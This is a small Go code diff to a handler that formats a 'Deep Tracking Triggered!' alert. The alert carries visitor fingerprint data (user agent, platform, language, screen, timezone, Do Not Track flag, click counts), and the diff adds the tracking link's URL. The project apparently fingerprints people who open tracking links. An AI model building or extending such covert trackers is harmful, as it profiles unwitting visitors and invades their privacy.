@@ -133,7 +133,9 @@ func trackDeepData(c *gin.Context) {
 	fpDetails := fmt.Sprintf("\n\n🧠 *Fingerprint Info:*\nUser-Agent: `%s`\nPlatform: `%s`\nLang: `%s`\nScreen: `%s`\nTouch: `%v`\nDNT: `%v`\nTimezone: `%s`",
 		safeString(fp["userAgent"]), safeString(fp["platform"]), safeString(fp["language"]), safeString(fp["screen"]), safeString(fp["touchSupport"]), safeString(fp["dnt"]), safeString(fp["timezone"]))
 
-	summary := fmt.Sprintf("📍 *Deep Tracking Triggered!*\nID: `%s`\nDuration: `%dms`\nClicks/Moves: `%d`%s%s%s",
+	summary := fmt.Sprintf("📍 *Deep Tracking Triggered!*\nID: `%s`\nSource URL: `%s/track/%s`\nDuration: `%dms`\nClicks/Moves: `%d`%s%s%s",
+		data.ID,
+		linkPrefix,
 		data.ID,
 		data.Duration,
 		len(data.Events),
